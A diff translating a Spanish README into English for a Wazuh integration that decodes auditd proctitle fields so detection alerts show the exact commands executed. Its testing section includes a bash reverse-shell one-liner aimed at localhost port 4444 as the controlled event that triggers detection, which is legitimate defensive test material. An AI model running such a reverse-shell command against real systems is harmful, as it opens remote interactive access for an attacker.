@@ -1,40 +1,49 @@
-# Integración auditd → Wazuh con decodificación de proctitle
+# Auditd + Wazuh with proctitle decoding integration
 
-## 1. Objetivo
+## 1. Objective
 
-Esta integración permite:
+This integration allows you to:
 
-* Capturar eventos de auditd (tipos SYSCALL, EXECVE y PROCTITLE).
-* Decodificar el campo proctitle, que viene en hexadecimal, y transformarlo a texto legible.
-* Enriquecer los eventos en Wazuh con el comando exacto ejecutado por el usuario.
-* Generar reglas de correlación que disparan alertas cuando se detectan llamadas a syscall=execve y comandos específicos.
+* Capture auditd events (types SYSCALL, EXECVE, and PROCTITLE).
 
-## 2. Requisitos
+* Decode the proctitle field, which comes in hexadecimal, and transform it into human-readable text.
 
-* Wazuh Manager 4.12 (probado en esa version).
-* auditd instalado, habilitado y generando logs en /var/log/audit/audit.log.
-* Reglas auditd que registren execve y proctitle, por ejemplo en /etc/audit/rules.d/audit.rules:
+* Enrich Wazuh events with the exact command executed by the user.
+
+* Generate correlation rules that trigger alerts when syscall=execve calls and specific commands are detected.
+
+## 2. Requirements
+
+* Wazuh Manager 4.12 (tested on this version).
+
+* Auditd installed, enabled, and generating logs in /var/log/audit/audit.log.
+
+* Auditd rules that log execve and proctitle, for example in /etc/audit/rules.d/audit.rules:
 
 ```bash
 -a always,exit -F arch=b64 -S execve -k execmonitor
 -a always,exit -F arch=b32 -S execve -k execmonitor
 ```
 
-## 3. Paso a paso
+## 3. Step by step
 
-### 3.1. Crear decoders personalizados
+### 3.1. Create custom decoders
 
-* Modificar la configuracion para editar el decoder por defecto de Auditd en Wazuh.
-* El archivo en cuestion es __0040-auditd_decoders.xml__
-* Seguir la documentacion para realizar esta configuracion: https://documentation.wazuh.com/4.6/user-manual/ruleset/custom.html
+* Modify the configuration to edit the default Auditd decoder in Wazuh.
+ 
+* The relevant file is __0040-auditd_decoders.xml__
 
-Incluye decoders para:
+* Follow the documentation to apply this configuration: https://documentation.wazuh.com/4.6/user-manual/ruleset/custom.html
 
-* SYSCALL (extrae uid, auid, exe, syscall, comm, pid, ppid).
-* PROCTITLE (extrae el campo hex).
-* EXECVE (extrae argumentos opcionales).
+Includes decoders for:
 
-Ejemplo de bloque para PROCTITLE:
+* SYSCALL (extracts uid, auid, exe, syscall, comm, pid, ppid).
+
+* PROCTITLE (extracts the hex field).
+
+* EXECVE (extracts optional arguments).
+
+Example block for PROCTITLE:
 
 ```xml
 <!-- PROCTITLE -->
@@ -45,22 +54,22 @@ Ejemplo de bloque para PROCTITLE:
 </decoder>
 ```
 
-### 3.2. Script de decodificación (custom integration)
+### 3.2. Decoding script (custom integration)
 
-Archivo: __/var/ossec/integrations/custom-auditd_decoder.py__
+File: __/var/ossec/integrations/custom-auditd_decoder.py__
 
-Este script convierte el campo HEX de proctitle a texto claro y lo devuelve generado en una alerta nueva.
+This script converts the HEX proctitle field into clear text and returns it as a new generated alert.
 
-Permisos recomendados:
+Required Permissions:
 
 ```bash
 chmod 750 /var/ossec/integrations/custom-auditd_decoder.py
 chown root:wazuh /var/ossec/integrations/custom-auditd_decoder.py
 ```
 
-### 3.3. Definir la integracion en Wazuh
+### 3.3. Define the integration in Wazuh
 
-En __/var/ossec/etc/ossec.conf__, dentro de __<ossec_config>__:
+In __/var/ossec/etc/ossec.conf__, inside __<ossec_config>__:
 
 ```xml
 <integration>
@@ -70,11 +79,11 @@ En __/var/ossec/etc/ossec.conf__, dentro de __<ossec_config>__:
 </integration>
 ```
 
-### 3.4. Crear reglas personalizadas
+### 3.4. Create custom rules
 
-Archivo: __/var/ossec/etc/rules/audit_custom.xml__
+File: __/var/ossec/etc/rules/audit_custom.xml__
 
-Ejemplo básico:
+Basic Example:
 
 ```xml
 <rule id="100365" level="3">
@@ -96,25 +105,23 @@ Ejemplo básico:
 
 ```
 
-## 4. Reiniciar servicios
+## 4. Restart services
 
-Tras cada cambio, reiniciar Wazuh Manager:
+After each change, restart Wazuh Manager:
 
 ```bash
 systemctl restart wazuh-manager
 ```
 
-## 5. Verificación y pruebas
+## 5. Verification and testing
 
-### 1. Generar un evento controlado:
-
-Se ejecuta el siguiente comando:
+### 1. Generate a controlled event by executing:
 
 ```bash
 find /tmp -name "temp_file.txt" -exec /usr/bin/python3 -c "import os; os.system('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1')" \;
 ```
 
-### 2. Revisar el log de Wazuh
+### 2. Check the Wazuh log
 
 ![](./media/auditd1.png)
 
@@ -122,10 +129,12 @@ find /tmp -name "temp_file.txt" -exec /usr/bin/python3 -c "import os; os.system(
 
 ![](./media/auditd3.png)
 
-## 6. Resultados esperados
+## 6. Expected results
 
-Cada ejecución de comando vía execve queda reflejada en Wazuh con:
+Each command execution via execve is reflected in Wazuh with:
 
-* Usuario (uid, auid).
-* Proceso (exe, comm, pid, ppid).
-* Comando exacto en texto claro (proctitle.msg).
+* User (uid, auid).
+  
+* Process (exe, comm, pid, ppid).
+  
+* Exact command in clear text (proctitle.msg).
